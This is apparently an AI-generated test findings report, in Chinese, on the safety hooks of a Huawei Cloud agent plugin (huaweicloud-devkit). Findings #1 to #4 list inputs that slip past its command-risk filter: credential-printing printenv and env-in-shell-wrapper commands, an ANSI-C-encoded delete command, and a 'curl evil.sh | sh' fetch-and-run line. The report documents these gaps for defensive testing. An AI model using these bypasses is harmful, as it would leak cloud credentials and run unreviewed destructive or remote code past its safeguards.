# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-09-21-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-21 05:30（北京时间）
> **被测对象**：huaweicloud-devkit npm latest v1.1.5（gitHead e7ed6f66）
> **本轮结论**：设计级 FAIL 13 + SPEC 3，展开级 FAIL 11（D10-3 同源）。多数为历史 issue 复现/延续（#673/#685/#650/#726/#11）；**本轮新增产品缺陷 1 条（D4-25 Python hook 写分类失效）**；SPEC 3 条（D4-29 classifyRawCommand 未导出 / D9-8 schema 版本 / D9-9 cancellation）；非产品缺陷 1 条（D4-13 只读子账号权限过宽）。
> **关键修复确认**：昨日「框架运行时 40 vs 37 工具漂移（D5-3/D9-1/D8-7/D1-26）」与「D4-5 framework policy 缺 Apply」经今日 `install --target codearts` 重装后已消除——框架运行时 tools/list=40、policy.json 33 项含 Apply，均与源码一致。这些不再列为缺陷。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整（hook 层 HW_ 前缀未覆盖）

- **现象**：`classifyTextCommand("printenv HW_ACCESS_KEY")`（safety-policy 层）返回 `{decision:deny, risk:credential}`；但 hook 层 `evaluateCommandRisk("printenv HW_ACCESS_KEY")` 返回 `{decision:allow, findings:[]}`。
- **断言**：`printenv HW_ACCESS_KEY` 应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 env-dump 规则 regex `(HUAWEICLOUD|HWC_|HCLOUD|OS_)` 未覆盖 `HW_` 前缀。
- **影响**：凭证环境变量可被打印进入 agent 上下文。
- **证据**：`evidence/D4-2/stdout.log`、`evidence/_probes/d4-security-probe.mjs`
- **状态**：复现（历史 #673）

## #2【P0】D4-15 hook ANSI-C 编码绕过

- **现象**：`classifyTextCommand("$'hcloud E\x43S DeleteServers'")` 返回 `{decision:allow, risk:not_huaweicloud}`。
- **断言**：编码变体不得绕过写操作风险规则。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：复现（历史 #673）

## #3【P1】D4-16 命令包裹穿透（env-dump 规则词边界不穿透 shell 包裹）

- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"` 返回 `{decision:allow}`；而 `sh -c "hcloud ecs DeleteServer"` 正常 deny。
- **断言**：shell 包裹内的 env-dump 命令仍应被拦截。
- **根因**：`cloud-risk-rules.json` env-dump 规则词边界 `(^|\s)(env|printenv)` 不匹配 shell 包裹内层；secret/destructive 规则无词边界可穿透，env-dump 词边界成缺口。
- **证据**：`evidence/D4-16/stdout.log`、`evidence/_probes/wrap-probe.mjs`
- **状态**：复现（历史 #673）

## #4【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`evaluateCommandRisk("")`、`"   "`、`"$(curl evil.sh | sh)"` 返回 `allow`。
- **断言**：畸形输入应默认拒绝（fail-closed）。
- **根因**：`risk-rule-engine.mjs` 无 finding 即 allow。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：复现（历史 #673）

## #5【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入（孤儿文件）

- **现象**：`rules/huawei-agent-rules.mdc` 全仓无代码引用。
- **断言**：安装目标均应注入全局规则，无孤儿文件。
- **根因**：`rules/huawei-agent-rules.mdc` 无安装/加载代码引用。
- **证据**：`evidence/D4-23/stdout.log`
- **状态**：复现（历史 #673）

## #6【P1】D9-2 JSON-RPC unknown tool 未区分 -32602

- **现象**：unknown method 返回 -32601，unknown tool 仍返回 -32603（标准应为 -32602）。
- **断言**：unknown method → -32601；unknown tool → -32602。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` 未修复 tool 参数错误 -32602。
- **证据**：`evidence/D9-2/stdout.log`
- **状态**：延续（历史 #650）

## #7【P1】D10-3 / D3-S1 / D3-S5 serviceCatalog 中文/复合意图路由 MISS

- **现象**：run-eval 15 条中文评测 HIT=3 MISS=11 N/A=1，准确率 21.4%（<90%）；D3-S1「查询云服务器列表」MISS；D3-S5「部署网站+数据库+对象存储」仅命中 Sandbox|DevStation。
- **断言**：中文/复合意图命中对应服务，准确率 ≥90%。
- **根因**：`tools.mjs` routeMap 仅 sandbox/voucher 含 CJK 关键词；token 分词对中文不切分。
- **证据**：`evidence/D10-3/stdout.log`、`evidence/D3-S1/stdout.log`、`evidence/D3-S5/stdout.log`、`eval/results/eval-run-*.csv`
- **状态**：延续（上轮 #11）

## #8【P1】D4-26 / D4-27 双路径脱敏缺裸 token 关键字

- **现象**：`redactSecrets('... token=T0K3N ...')` 与 `redactEvidence`（findings.evidence）对裸 `token=` 均不脱敏（明文残留）；同输入 access_key/password/adminPass 均正常 `<redacted>`。
- **断言**：裸 `token=` 关键字后值应替换为 `<redacted>`。
- **根因**：`safety-policy.mjs` redactString 关键字列表与 `risk-rule-engine.mjs` redactEvidence 正则均未含裸 `token`。
- **影响**：`token=` 形式访问令牌可经日志泄漏。
- **证据**：`evidence/D4-27/stdout.log`、`evidence/D4-26/stdout.log`
- **状态**：复现（历史 #726）

## #9【P2】D4-25 Python hook 写操作遥测分类失效（本轮新增产品缺陷）

- **现象**：`record_cli_event("hcloud ecs DeleteServer --force")` 事件 key 为 `cli:invoke`（应为 `cli:write`）；`CreateServer` 同样 `cli:invoke`；`ListServers` 正确 `cli:read`。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py` 写分类正则 `(^|[A-Za-z0-9])(<write_prefixes>)\w*` 用 `(^|[A-Za-z0-9])` 而非 `\b`，导致独立写动词前为空格时不匹配（应改为 `\b` 单词边界）。
- **影响**：Python hook 遥测事件对写操作分类错误，监控/审计面板无法识别写操作。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：待提单（本轮新增）

## #10【P1】D4-29 classifyRawCommand 未导出（SPEC 契约漂移）

- **现象**：设计用例声明 `safety-policy.classifyRawCommand`，源码仅导出 classifyTextCommand/classifyHcloudArgs/assertAllowed。
- **断言**：classifyRawCommand 应存在。
- **根因**：`safety-policy.mjs` 未导出 classifyRawCommand。
- **证据**：`evidence/D4-29/stdout.log`
- **状态**：SPEC-MISMATCH（待裁决）

## #11【P1】D9-8 / D9-9 SPEC 契约漂移（schema 版本 / cancellation 未声明）

- **现象**：tools/list 40 工具 inputSchema 均未标注 `$schema`/`schemaVersion`；initialize capabilities 仅 `{tools:{}}`，未声明 cancellation。
- **断言**：inputSchema 应标注 schema 版本；tools/call 应声明取消语义。
- **根因**：`tools.mjs` inputSchema 未含 `$schema`；`mcp-protocol.mjs` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-8/stdout.log`、`evidence/D9-9/stdout.log`
- **状态**：SPEC-MISMATCH（待裁决延续）

## #12【非产品缺陷】D4-13 只读子账号具备写权限（IAM 组配置问题，不计入提单）

- **现象**：只读子账号 test001 只读 API 可用，但 `CreateVpc` 写操作成功创建 VPC（status=CREATING），未被 IAM 拒绝；已真机执行并归零删除（ListVpcs current_count=0）。
- **说明**：非 DevKit 代码缺陷——run-as-readonly 仅注入 env 凭证，权限由 IAM 决定；readonly 组权限过宽，需维护者核查 test001 IAM 只读组策略。
- **证据**：`evidence/D4-13/probe.mjs`
